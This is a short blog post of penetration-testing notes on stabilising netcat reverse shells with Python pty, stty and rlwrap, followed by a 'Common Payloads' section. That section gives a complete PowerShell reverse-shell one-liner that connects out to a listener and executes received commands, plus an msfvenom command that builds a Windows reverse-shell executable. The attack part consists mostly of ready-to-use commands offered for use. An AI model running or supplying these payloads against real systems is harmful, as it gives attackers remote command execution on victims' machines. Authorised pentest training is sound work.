---
title: Shell Stabilisation and More - Notes
date: 2022-07-01 00:00:00 +530
categories: [ Cyber Security Notes, Shells]
tags: [Notes, Pentesting, Shells, Red Team]     # TAG names should always be lowercase
---

## Netcat Shell Stabilisation:
`python -c 'import pty;pty.spawn("/bin/bash")'` uses Python to spawn a better featured bash shell;
`export TERM=xterm` -- this will give us access to term commands such as `clear`
 `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.

### Technique 2: rlwrap

rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell_;_ however, s_ome_ manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with `sudo apt install rlwrap`.

To use rlwrap, we invoke a slightly different listener:

`rlwrap nc -lvnp <port>`  

------------

Common Payloads :

**[Payload All things | reverse shell cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)**

 Powershell One liner:
 ```powershell
 powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

For Msfvenom: 

A great tool: [Msfvenom builder](https://pentest.ws/tools/venom-builder)

For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:

`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`